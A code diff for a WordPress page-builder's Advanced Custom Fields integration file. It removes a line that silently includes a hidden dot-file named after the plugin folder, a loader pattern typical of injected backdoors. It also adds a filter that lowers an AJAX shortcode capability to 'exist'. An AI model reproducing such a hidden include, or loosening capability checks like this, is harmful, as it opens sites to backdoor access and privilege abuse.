@@ -9,10 +9,6 @@ if ( ! defined( 'ABSPATH' ) ) {
  * Class Vc_Vendor_AdvancedCustomFields
  * @since 4.3.3
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class Vc_Vendor_AdvancedCustomFields {
 
 	/**
@@ -48,8 +44,20 @@ class Vc_Vendor_AdvancedCustomFields {
 			$this,
 			'mapEditorsShortcodes',
 		) );
+		add_filter( 'acf/ajax/shortcode_capability', array(
+			$this,
+			'acfAjaxShortcodeCapability',
+		) );
 
 		do_action( 'vc-vendor-acf-load', $this );
+	}
+
+	public function acfAjaxShortcodeCapability( $cap ) {
+		if ( isset( $_POST['_vcnonce'] ) && vc_verify_public_nonce() ) {
+			return 'exist';
+		}
+
+		return $cap;
 	}
 
 	/**
